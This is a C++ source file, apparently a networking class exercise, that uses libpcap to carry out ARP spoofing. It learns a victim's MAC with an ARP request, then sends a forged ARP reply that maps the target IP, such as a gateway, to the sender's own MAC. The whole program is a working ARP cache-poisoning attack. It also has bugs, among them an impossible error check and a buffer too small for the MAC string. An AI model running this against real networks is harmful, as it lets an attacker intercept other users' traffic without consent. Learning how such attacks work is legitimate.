#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <libnet.h>
#include <stdlib.h>
#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test wlan0 192.168.1.2 192.168.1.1\n");
}



int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}
    char strip[20]={0};
    uint32_t * checkip;
    uint16_t * checkop;


	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
	}




    const u_char *repacket;











    //getmymac socket
    struct ifreq ifr;
    int s;
    char mymac[40];

    unsigned char macaddr[10];
    s= socket(AF_INET, SOCK_DGRAM,0);
    strncpy(ifr.ifr_name,argv[1],IFNAMSIZ);
    if(ioctl(s,SIOCGIFHWADDR,&ifr)<0){
        printf("error\n");
        return -1;
    }
    else {
        for(int i=0; i<6; i++){
            macaddr[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i];

    }
sprintf(mymac,"%02x:%02x:%02x:%02x:%02x:%02x",macaddr[0],macaddr[1],macaddr[2],macaddr[3],macaddr[4],macaddr[5]);

    }


    //getmyip SOCKET
    struct ifreq ifrip;
    int d;

    d= socket(AF_INET, SOCK_DGRAM,0);
    strncpy(ifrip.ifr_name,argv[1],IFNAMSIZ);
    if(ioctl(d,SIOCGIFADDR,&ifrip)<0){
        printf("error\n");
        return -1;
    }
   else {
      sprintf(strip,"%d.%d.%d.%d",(unsigned char)ifrip.ifr_addr.sa_data[2],(unsigned char)ifrip.ifr_addr.sa_data[3],(unsigned char)ifrip.ifr_addr.sa_data[4],(unsigned char)ifrip.ifr_addr.sa_data[5]);

    }
    printf("%s",strip);
   printf("\n\n%s\n\n",mymac);

    //

    // etherppacket request
    EthArpPacket packetreq;
    packetreq.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// modified dmac
    packetreq.eth_.smac_ = Mac(mymac);
    packetreq.eth_.type_ = htons(EthHdr::Arp);

    packetreq.arp_.hrd_ = htons(ArpHdr::ETHER);
    packetreq.arp_.pro_ = htons(EthHdr::Ip4);
    packetreq.arp_.hln_ = Mac::SIZE;
    packetreq.arp_.pln_ = Ip::SIZE;
    packetreq.arp_.op_ = htons(ArpHdr::Request);
    packetreq.arp_.smac_ = Mac(mymac);
    packetreq.arp_.sip_ = htonl(Ip(strip));
    packetreq.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packetreq.arp_.tip_ = htonl(Ip(argv[2]));
    int pres = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packetreq),sizeof(EthArpPacket));

    if(pres!=0){
        fprintf(stderr,"pcap_sendpacket error %s",pcap_geterr(handle));
    }
    // get packet
    pres=0;
    char tmacdr[10];


    while(1){

    struct pcap_pkthdr *header;
    pres=pcap_next_ex(handle,&header,&repacket);
    if(pres==0) continue;
    if(pres==-1&&pres==-2)
    {
        break;
    }
        struct tmacdata {
        uint8_t data[6];
        };
        tmacdata * pp;

        pp=(struct tmacdata *)(repacket+22);

        checkip = (uint32_t *)(repacket+28);
        checkop= (uint16_t *)(repacket+20);
        printf("\n %02x : ",htonl(Ip(argv[2])));
        printf(" %02x \n",*checkip);


        if(*checkop==512&&htonl(Ip(argv[2]))==*checkip)
    {

        sprintf(tmacdr,"%02x:%02x:%02x:%02x:%02x:%02x",pp->data[0],pp->data[1],pp->data[2],pp->data[3],pp->data[4],pp->data[5]);
        break;
    }

    printf("%02x \n",htons(*checkop));
}
    printf("\n\n%s\n\n",tmacdr);




    //

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(tmacdr);// modified dmac
    packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(mymac);
    packet.arp_.sip_ = htonl(Ip(argv[3]));
    packet.arp_.tmac_ = Mac(tmacdr);
    packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);

}
